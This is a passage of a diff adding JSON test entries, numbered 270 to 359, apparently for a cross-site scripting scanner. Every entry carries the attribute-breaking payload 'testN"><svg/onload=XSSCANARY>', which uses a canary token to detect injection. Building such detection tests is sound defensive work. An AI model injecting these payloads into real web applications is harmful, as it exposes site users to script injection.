+      "sink": "generated",
+      "payload": "test270\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test271\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test272\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test273\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test274\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test275\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test276\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test277\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test278\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test279\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test280\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test281\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test282\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test283\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test284\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test285\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test286\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test287\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test288\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test289\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test290\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test291\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test292\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test293\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test294\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test295\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test296\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test297\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test298\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test299\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test300\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test301\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test302\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test303\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test304\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test305\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test306\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test307\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test308\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test309\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test310\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test311\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test312\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test313\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test314\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test315\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test316\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test317\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test318\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test319\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test320\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test321\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test322\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test323\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test324\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test325\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test326\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test327\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test328\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test329\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test330\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test331\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test332\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test333\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test334\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test335\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test336\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test337\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test338\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test339\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test340\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test341\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test342\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test343\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test344\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test345\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test346\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test347\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test348\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test349\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test350\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test351\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test352\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test353\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test354\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test355\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test356\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test357\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test358\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test359\"><svg/onload=XSSCANARY>"
+    }
+  ]
+}
